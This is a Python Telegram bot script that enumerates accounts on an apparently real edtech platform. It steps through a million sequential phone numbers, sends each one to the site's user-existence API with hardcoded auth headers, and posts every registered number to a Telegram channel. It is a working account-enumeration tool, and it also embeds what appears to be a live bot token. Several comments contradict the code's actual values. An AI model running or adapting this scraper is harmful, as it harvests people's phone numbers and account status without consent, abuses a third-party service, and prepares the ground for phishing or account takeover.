import requests
import time
import asyncio
from telegram import Update
from telegram.ext import Application, CommandHandler, ContextTypes

# Your Telegram bot token
TOKEN = '7193921126:AAFOJVvniqaxqFzePHfHlgK0I23Rwwx5sEw'
CHANNEL_ID = '-1002388515011'  # The channel where you want to post progress

# URL and headers for checking the user
url = "https://tempapi2.classx.co.in/get/check_user_exist"
headers = {
    "Client-Service": "Appx",
    "Auth-Key": "appxapi",
    "source": "website"
}

# Function to check user existence
def check_user_exist(phone_number):
    params = {
        "email_or_phone": str(phone_number)
    }

    # Sending the GET request
    response = requests.get(url, headers=headers, params=params)

    if response.status_code == 200:
        response_data = response.json()
        if response_data.get("data") == True:
            return True
    return False

# Function to run the number check and send progress updates
async def check_numbers(update: Update, context: ContextTypes.DEFAULT_TYPE):
    total_numbers = 1000000  # We will check 1000 numbers
    start_number = 9352630599
    checked_numbers = 0
    last_checked_number = None  # To store the last checked number
    start_time = time.time()  # Start time for calculating elapsed time

    # Send initial progress message
    progress_message = await update.message.reply_text(
        text="Starting to check numbers...\n"
             f"Total numbers: {total_numbers}\n"
             f"Checked numbers: {checked_numbers}\n"
             f"Time left: Calculating...\n"
             f"Last checked number: N/A"
    )

    # Time interval between each check (60 seconds / 1000 numbers = 0.06 seconds)
    check_interval = 0.001

    # Progress bar loop
    for phone_number in range(start_number, start_number + total_numbers):
        # Check if the user exists
        if check_user_exist(phone_number):
            # Send message to the channel if user exists
            await context.bot.send_message(
                chat_id=CHANNEL_ID,
                text=f"{phone_number}"
            )

        # Update last checked number
        last_checked_number = phone_number

        # Update progress after each check
        checked_numbers += 1
        elapsed_time = time.time() - start_time
        time_left = (total_numbers - checked_numbers) / (checked_numbers / elapsed_time)
        minutes_left = time_left // 60
        seconds_left = time_left % 60

        # Update the progress message every 100 checks
        if checked_numbers % 100 == 0:
            # Update progress in the channel every 100 checks
            await progress_message.edit_text(
                text=f"Progress:\n"
                     f"Total numbers: {total_numbers}\n"
                     f"Checked numbers: {checked_numbers}\n"
                     f"Time left: {int(minutes_left)}:{int(seconds_left)}\n"
                     f"Last checked number: {last_checked_number}"
            )

        # Sleep to ensure we check 1000 numbers in 60 seconds
        await asyncio.sleep(check_interval)  # This ensures we wait before proceeding to next number

    # Final message when completed
    await progress_message.edit_text(
        text=f"Finished checking numbers.\nTotal numbers: {total_numbers}\nChecked numbers: {checked_numbers}\nLast checked number: {last_checked_number}"
    )

# Function to start the bot
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text("Bot started! Use /check to start checking numbers.")

# Main function to start the bot and handle commands
def main():
    application = Application.builder().token(TOKEN).build()

    application.add_handler(CommandHandler("start", start))
    application.add_handler(CommandHandler("check", check_numbers))

    application.run_polling()

if __name__ == "__main__":
    main()
